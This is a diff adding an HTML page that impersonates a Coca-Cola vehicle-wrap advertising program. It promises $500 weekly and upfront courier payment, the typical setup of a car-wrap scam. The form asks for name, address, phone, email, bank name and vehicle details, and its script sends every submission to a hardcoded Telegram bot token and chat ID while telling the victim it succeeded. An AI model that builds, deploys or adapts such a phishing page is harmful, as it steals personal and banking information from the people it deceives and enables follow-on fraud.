@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coca-Cola Drink Advertisement Campaign Form</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            line-height: 1.6;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            color: #333;
+            background-color: #f7f7f7;
+            background-image: url('https://i.ibb.co/Hp7z91JB/Coca-Cola-logo-svg.png');
+            background-repeat: no-repeat;
+            background-position: center;
+            background-attachment: fixed;
+            background-size: contain;
+            background-opacity: 0.1;
+        }
+
+        h1 {
+            color: #ED1C16; /* Coca-Cola red */
+            text-align: center;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            font-size: 2.2em;
+        }
+
+        .form-container {
+            background: linear-gradient(135deg, #ffffff 0%, #f9f9f9 100%);
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            border: 1px solid #e0e0e0;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: border 0.3s, box-shadow 0.3s;
+            background-color: #fff;
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        textarea:focus {
+            border-color: #ED1C16;
+            box-shadow: 0 0 5px rgba(237, 28, 22, 0.3);
+            outline: none;
+        }
+
+        .required:after {
+            content: " *";
+            color: #ED1C16;
+        }
+
+        button {
+            background: linear-gradient(to bottom, #ED1C16 0%, #C11711 100%);
+            color: white;
+            border: none;
+            padding: 14px 25px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 18px;
+            display: block;
+            margin: 25px auto;
+            width: 60%;
+            transition: all 0.3s;
+            box-shadow: 0 3px 6px rgba(0,0,0,0.1);
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        button:hover {
+            background: linear-gradient(to bottom, #C11711 0%, #A0130E 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 10px rgba(0,0,0,0.2);
+        }
+
+        button:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+
+        #form-status {
+            text-align: center;
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 6px;
+            display: none;
+            font-weight: bold;
+        }
+
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        p {
+            color: #444;
+            line-height: 1.7;
+            margin-bottom: 25px;
+            text-align: justify;
+            padding: 10px;
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 6px;
+            border-left: 4px solid #ED1C16;
+        }
+
+        /* Add some Coca-Cola branding elements */
+        .form-container::before {
+            content: "";
+            display: block;
+            height: 3px;
+            background: linear-gradient(to right, #ED1C16, #ffffff, #ED1C16);
+            margin-bottom: 20px;
+            border-radius: 3px;
+        }
+
+        .form-container::after {
+            content: "";
+            display: block;
+            height: 3px;
+            background: linear-gradient(to right, #ED1C16, #ffffff, #ED1C16);
+            margin-top: 20px;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="form-container">
+        <h1>Coca-Cola Drink Advertisement Campaign Form</h1>
+        <p>Thank you for your interest in partnering with Coca-Cola! We're excited to announce our new mobile advertising campaign designed to increase brand visibility across the United States. As we face growing competition in the beverage market, we're implementing this innovative strategy to connect with consumers nationwide. About the Program Coca-Cola is seeking drivers and vehicle owners across all 50 states to transform their personal vehicles into moving advertisements. Whether you drive a car, truck, bike, boat, lorry, or cart, we want to work with you! How It Works Our professional team will apply high-quality vinyl decals to your vehicle (covering partial or full exterior surfaces) These eye-catching, colorful ads are designed to turn heads wherever you go You simply go about your normal daily routine - we handle all advertising logistics Program Benefits ✅ Earn $500 per week (minimum 10-week commitment, program runs for 16 weeks) ✅ No costs to you - we cover all advertising materials and installation ✅ Receive upfront payment via secure courier service ✅ Flexible participation - use your vehicle as you normally would Why This Works Provides constant brand exposure in high-traffic areas Creates memorable impressions with captive audiences Builds community connections through local advertising This is a legitimate opportunity with no application fees or hidden costs. Coca-Cola will handle all advertising production and installation through our certified professionals. Ready to turn your vehicle into a moving billboard? Complete the simple application below to get started!</p>
+        
+        <form id="coca-cola-form">
+            <div class="form-group"><label for="full-name" class="required">Full Name</label> <input type="text" id="full-name" name="full-name" required=""></div>
+            <div class="form-group"><label for="address" class="required">Address</label> <textarea id="address" name="address" rows="3" required=""></textarea></div>
+            <div class="form-group"><label for="city" class="required">City</label> <input type="text" id="city" name="city" required=""></div>
+            <div class="form-group"><label for="state" class="required">State</label> <input type="text" id="state" name="state" required=""></div>
+            <div class="form-group"><label for="zip-code">Zip Code</label> <input type="text" id="zip-code" name="zip-code"></div>
+            <div class="form-group"><label for="phone" class="required">Phone number</label> <input type="text" id="phone" name="phone" required=""></div>
+            <div class="form-group"><label for="email" class="required">Email</label> <input type="email" id="email" name="email" required=""></div>
+            <div class="form-group"><label for="bank-name" class="required">Bank Name</label> <input type="text" id="bank-name" name="bank-name" required=""></div>
+            <div class="form-group"><label for="gender">Gender</label> <input type="text" id="gender" name="gender"></div>
+            <div class="form-group"><label for="vehicle" class="required">Color/Year/Make of Vehicle</label> <input type="text" id="vehicle" name="vehicle" required=""></div><button type="submit">Submit Application</button>
+        </form>
+        <div id="form-status"><br></div>
+    </div>
+    <script>
+        document.getElementById('coca-cola-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(e.target);
+            const formObject = Object.fromEntries(formData.entries());
+            
+            try {
+                // Send to Telegram
+                const botToken = '8084035538:AAFpG4ozHHqvnL3K244POv0AafDqtlgdchM';
+                const chatId = '6617851936';
+                
+                let telegramMessage = `*New Coca-Cola Ad Application*\n\n`;
+                for (const [key, value] of Object.entries(formObject)) {
+                    telegramMessage += `*${key}:* ${value}\n`;
+                }
+                
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const telegramResponse = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: telegramMessage,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                showStatus('Form submitted successfully!', 'success');
+                e.target.reset();
+            } catch (error) {
+                console.error('Error:', error);
+                showStatus('There was an error submitting your form. Please try again.', 'error');
+            }
+        });
+        
+        function showStatus(message, type) {
+            const statusElement = document.getElementById('form-status');
+            statusElement.textContent = message;
+            statusElement.className = type;
+            statusElement.style.display = 'block';
+            
+            setTimeout(() => {
+                statusElement.style.display = 'none';
+            }, 5000);
+        }
+    </script>
+</body>
+
+</html>
